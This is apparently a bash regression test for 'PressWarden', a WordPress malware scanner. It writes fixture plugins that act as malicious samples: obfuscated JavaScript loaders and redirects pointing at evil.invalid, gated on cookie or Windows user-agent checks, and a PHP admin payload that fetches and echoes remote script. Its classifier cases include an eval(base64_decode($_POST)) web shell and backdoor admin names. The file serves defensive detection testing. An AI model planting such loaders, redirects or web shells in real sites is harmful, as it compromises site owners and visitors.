#!/usr/bin/env bash
set -euo pipefail
ROOTDIR="$(cd "$(dirname "$0")/.." && pwd)"
TMP="${TMPDIR:-/tmp}/presswarden-threat-intel.$$"
trap 'rm -rf "$TMP"' EXIT
SITE="$TMP/sites/example.com/public_html"
mkdir -p "$SITE/wp-admin" \
  "$SITE/wp-content/plugins/malicious-js" \
  "$SITE/wp-content/plugins/multi-js" \
  "$SITE/wp-content/plugins/benign-js" \
  "$SITE/wp-content/plugins/framework-bundle" \
  "$SITE/wp-content/plugins/admin-target" \
  "$SITE/wp-content/plugins/admin-hook-only" \
  "$SITE/wp-content/plugins/wordfence-like" \
  "$SITE/wp-content/plugins/benign-admin" \
  "$SITE/wp-includes"
touch "$SITE/wp-settings.php" "$SITE/wp-load.php"
printf '<?php $wp_version = "7.1";\n' > "$SITE/wp-includes/version.php"

# High-confidence PW-JS-002 now requires the encoded loader to be tied to a
# visitor/environment evasion gate. This models redirect/injection malware
# without treating ordinary encoded asset loaders as malware.
cat > "$SITE/wp-content/plugins/malicious-js/loader.js" <<'JS'
if (document.cookie.indexOf('pw_seen=') === -1) { var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100,47,120,46,106,115);document.head.appendChild(s); }
JS
cat > "$SITE/wp-content/plugins/malicious-js/redirect.js" <<'JS'
var u=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100);window.location.href=u;
JS

# The first decoded variable is intentionally harmless. Detectors must inspect
# every decoder assignment and still follow the later value into the sink.
cat > "$SITE/wp-content/plugins/multi-js/loader.js" <<'JS'
var harmless=atob('aGVsbG8=');console.log(harmless);if(navigator.userAgent.indexOf('Windows')!==-1){var payload=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQveC5qcw==');var s=document.createElement('script');s.src=payload;document.head.appendChild(s);}
JS
cat > "$SITE/wp-content/plugins/multi-js/redirect.js" <<'JS'
const harmless=atob('aGVsbG8=');console.log(harmless);const target=atob('aHR0cHM6Ly9ldmlsLmludmFsaWQ=');window.location.replace(target);
JS

cat > "$SITE/wp-content/plugins/benign-js/loader.js" <<'JS'
(function(){var decoded=atob('aGVsbG8=');console.log(decoded);var s=document.createElement('script');s.src='https://cdn.example.com/app.js';document.head.appendChild(s);}());
JS
cat > "$SITE/wp-content/plugins/benign-js/redirect.js" <<'JS'
window.location.href='/account';
JS
# Static encoded external URLs occur in legitimate application/security/core
# assets. Encoding + script creation + insertion alone must stay clean.
cat > "$SITE/wp-content/plugins/benign-js/static-encoded-loader.js" <<'JS'
(function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9jZG4uZXhhbXBsZS5jb20vYXBwLmpz');document.head.appendChild(s);}());
JS

# Framework/minified bundles commonly reuse short variable names across
# independent modules. Elementor, MailPoet, and similar applications may decode
# runtime configuration in one module and dynamically load a normal chunk in
# another. Those unrelated behaviors must never be combined into PW-JS-002.
cat > "$SITE/wp-content/plugins/framework-bundle/elementor-like.js" <<'JS'
(function(){const e=atob(window.elementorRuntimeSettings);window.consumeSettings(e);}());
(function(){const e=window.elementorChunkUrl;const s=document.createElement('script');s.src=e;s.async=true;document.head.appendChild(s);}());
JS
cat > "$SITE/wp-content/plugins/framework-bundle/mailpoet-like.js" <<'JS'
(function(){const e=decodeURIComponent(window.mailpoetAssetUrl);const s=document.createElement('script');s.src=e;document.body.appendChild(s);}());
JS
# A LiteSpeed-style generated/concatenated asset can place unrelated decoder
# and loader modules in one file; variable reuse must still stay clean.
cat "$SITE/wp-content/plugins/framework-bundle/elementor-like.js" "$SITE/wp-content/plugins/framework-bundle/mailpoet-like.js" > "$SITE/wp-content/plugins/framework-bundle/litespeed-like.js"

cat > "$SITE/wp-content/plugins/admin-target/payload.php" <<'PHP'
<?php
if (is_admin() && current_user_can('manage_options')) {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (strpos($ua, 'Windows') !== false) {
        $r = wp_remote_get('https://example.invalid/payload');
        $js = base64_decode(wp_remote_retrieve_body($r));
        echo '<script>'.$js.'</script>';
    }
}
PHP

# Hook registration is not itself a browser/output sink. This deliberately has
# every other PW-PHP-006 signal and must remain clean until the payload is
# actually emitted or passed to a browser-script API.
cat > "$SITE/wp-content/plugins/admin-hook-only/plugin.php" <<'PHP'
<?php
if (is_admin() && current_user_can('manage_options')) {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (strpos($ua, 'Windows') !== false) {
        $r = wp_remote_get('https://example.invalid/payload');
        $js = base64_decode(wp_remote_retrieve_body($r));
        add_action('admin_footer', function () use ($js) { return $js; });
    }
}
PHP

# Large legitimate utility files can contain every individual PW-PHP-006
# ingredient in unrelated methods. This models the real Wordfence wfUtils.php
# fleet false positive and must remain clean without any product-name allowlist.
cat > "$SITE/wp-content/plugins/wordfence-like/wfUtils.php" <<'PHP'
<?php
class wfUtilsLike {
    public static function adminPage() {
        if (is_admin() && current_user_can('manage_options')) { echo 'settings'; }
    }
    public static function userAgent() { return $_SERVER['HTTP_USER_AGENT'] ?? ''; }
    public static function windowsCompat() { return stripos(PHP_OS, 'Windows') === 0 || stripos(PHP_OS, 'Win64') === 0; }
    public static function fetchRules() { return wp_remote_get('https://security.example.invalid/rules'); }
    public static function decodeSetting($value) { return base64_decode($value); }
    public static function printStatus() { print 'ready'; }
}
PHP

cat > "$SITE/wp-content/plugins/benign-admin/plugin.php" <<'PHP'
<?php
if (is_admin() && current_user_can('manage_options')) {
    wp_enqueue_script('plugin-admin', plugin_dir_url(__FILE__).'/admin.js', [], '1.0.0', true);
}
PHP

js_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-js" PRESSWARDEN_CACHE_DIR="$TMP/cache-js" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/js-threat-intel.sh" 2>&1 || true)
printf '%s\n' "$js_out" | grep -q 'PW-JS-002'
printf '%s\n' "$js_out" | grep -q 'malicious-js/loader.js'
printf '%s\n' "$js_out" | grep -q 'multi-js/loader.js'
printf '%s\n' "$js_out" | grep -q 'PW-JS-004'
printf '%s\n' "$js_out" | grep -q 'malicious-js/redirect.js'
printf '%s\n' "$js_out" | grep -q 'multi-js/redirect.js'
if printf '%s\n' "$js_out" | grep -qE 'benign-js/|framework-bundle/'; then
  printf '%s\n' "$js_out" >&2
  printf 'benign JavaScript/framework bundle lookalike was falsely flagged\n' >&2
  exit 1
fi

php_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-php" PRESSWARDEN_CACHE_DIR="$TMP/cache-php" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/php-threat-intel.sh" 2>&1 || true)
printf '%s\n' "$php_out" | grep -q 'PW-PHP-006'
printf '%s\n' "$php_out" | grep -q 'admin-target/payload.php'
if printf '%s\n' "$php_out" | grep -qE 'benign-admin/plugin.php|admin-hook-only/plugin.php|wordfence-like/wfUtils.php'; then
  printf '%s\n' "$php_out" >&2
  printf 'benign/non-flow admin utility behavior was falsely flagged\n' >&2
  exit 1
fi

php -r '
require $argv[1];
$tests = [
  [presswarden_db_classify_content("<script src=\"https://evil.invalid/x.js\"></script><script>eval(atob(\"QQ==\"))</script>", "option", "widget_text"), "PW-DB-001"],
  [presswarden_db_classify_content("<script src=\"https://cdn.example.com/app.js\"></script>", "option", "header_scripts"), "PW-DB-003"],
  [presswarden_db_classify_content("<?php eval(base64_decode(\$_POST[\"x\"]));", "post", "code"), "PW-DB-005"],
  [presswarden_db_classify_content("<script src=\"https://cdn.example.com/app.js\"></script>", "post", "page"), null],
  [presswarden_db_classify_admin("adminbackup", "adminbackup@wordpress.org"), "PW-DB-004"],
  [presswarden_db_classify_admin("deadbeefdeadbeefdeadbeefdeadbeef", "deadbeefdeadbeefdeadbeefdeadbeef@abcd.example"), "PW-DB-004"],
  [presswarden_db_classify_admin("siteowner", "owner@example.com"), null]
];
foreach ($tests as $i => $t) {
  $got = is_array($t[0]) ? $t[0][1] : null;
  if ($got !== $t[1]) { fwrite(STDERR, "DB classifier test $i failed\n"); exit(1); }
}
' "$ROOTDIR/lib/db-threat-classify.php"

awk -F'\t' 'BEGIN{bad=0} /^#/||NF==0{next} NF!=11{print "native rule metadata field mismatch at line " NR > "/dev/stderr";bad=1} END{exit bad}' "$ROOTDIR/intel/native-rules.tsv"
grep -q 'PW-CAMP-005' "$ROOTDIR/intel/campaigns.tsv"
grep -q 'PW-CAMP-006' "$ROOTDIR/intel/campaigns.tsv"
grep -q 'wp-db-malware' "$ROOTDIR/suites/db.sh"

status=$(PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-status" "$ROOTDIR/presswarden" intel status)
printf '%s\n' "$status" | grep -qE 'Native behavior rules[[:space:]]+16$'
printf '%s\n' "$status" | grep -qE 'Campaign families[[:space:]]+6$'
printf '%s\n' "$status" | grep -qE 'Native rule IDs[[:space:]]+22 total$'

printf 'PressWarden threat-intel regressions: PASS\n'
